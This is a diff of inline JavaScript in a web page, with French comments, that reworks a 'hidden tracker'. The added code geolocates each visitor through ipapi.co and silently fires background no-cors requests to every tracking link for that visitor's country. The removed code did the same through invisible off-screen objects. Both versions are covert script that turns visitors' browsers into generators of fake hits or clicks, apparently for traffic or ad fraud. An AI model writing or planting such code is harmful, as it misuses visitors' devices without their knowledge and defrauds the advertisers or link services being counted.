@@ -3470,9 +3470,9 @@ document.addEventListener("DOMContentLoaded", function() {
 
 
 <!-- ========================================== -->
-<!-- HIDDEN TRACKER (IP-BASED)                  -->
-<!-- US → 3 liens, BR → 3 liens, DE → 3 liens   -->
-<!-- 100% invisible, aucun popup, aucun blocage -->
+<!-- TRACKER LÉGER (FETCH API)                  -->
+<!-- Aucun iframe, aucun objet, aucun popup     -->
+<!-- Déclenche TOUS les liens du pays en fond   -->
 <!-- ========================================== -->
 <script>
 document.addEventListener("DOMContentLoaded", function() {
@@ -3522,49 +3522,7 @@ document.addEventListener("DOMContentLoaded", function() {
         ]
     };
 
-    // --- 3. FONCTION POUR CACHER LES LIENS ---
-    function loadHiddenObject(url) {
-        if (!url) return;
-        const obj = document.createElement('object');
-        obj.setAttribute('data', url);
-        obj.setAttribute('type', 'text/html');
-        
-        // Paramètres pour cacher complètement l'élément
-        obj.style.position = 'absolute';
-        obj.style.left = '-9999px'; // En dehors de l'écran
-        obj.style.top = '0';
-        obj.style.width = '1px';
-        obj.style.height = '1px';
-        obj.style.opacity = '0';    // Invisible
-        obj.style.pointerEvents = 'none'; // L'utilisateur ne peut pas cliquer dessus
-        obj.style.border = 'none';
-        
-        document.body.appendChild(obj);
-    }
-
-    // --- 4. ROTATION : 3 LIENS DIFFÉRENTS À CHAQUE VISITE ---
-    function getNextBatch(key, links, batchSize) {
-        const len = links.length;
-        let start = 0;
-        try {
-            start = parseInt(localStorage.getItem(key), 10);
-            if (isNaN(start) || start < 0) start = 0;
-        } catch (e) { start = 0; }
-        start = start % len;
-
-        const batch = [];
-        for (let i = 0; i < batchSize; i++) {
-            batch.push(links[(start + i) % len]);
-        }
-
-        // Sauvegarde la position pour la prochaine visite
-        const next = (start + batchSize) % len;
-        try { localStorage.setItem(key, String(next)); } catch (e) {}
-
-        return batch;
-    }
-
-    // --- 5. DÉTECTION IP ET CHARGEMENT EN ARRIÈRE-PLAN ---
+    // --- 3. DÉTECTION IP ET CHARGEMENT DE TOUS LES LIENS ---
     fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
@@ -3576,14 +3534,19 @@ document.addEventListener("DOMContentLoaded", function() {
                 return;
             }
 
-            const storageKey = 'hidden_obj_visit_index_' + country;
-            const batch = getNextBatch(storageKey, links, 3);
+            console.log('[Tracker] Démarrage de ' + links.length + ' liens pour ' + country + '...');
 
-            // Charge les 3 liens en arrière-plan, espacés d'1 seconde
-            batch.forEach((link, i) => {
+            // Boucle sur TOUS les liens du pays
+            links.forEach((link, i) => {
+                // 200ms de délai entre chaque requête pour ne pas surcharger le navigateur
                 setTimeout(() => {
-                    loadHiddenObject(link);
-                }, i * 1000);
+                    fetch(link, {
+                        mode: 'no-cors', // Permet d'envoyer la requête vers tatrck.com sans erreur CORS
+                        cache: 'no-store' // Force la requête à ne pas être mise en cache
+                    })
+                    .then(() => console.log('[Tracker] Lien ' + (i + 1) + '/' + links.length + ' compté.'))
+                    .catch(() => {}); // On ignore les erreurs
+                }, i * 200); 
             });
         })
         .catch(error => {
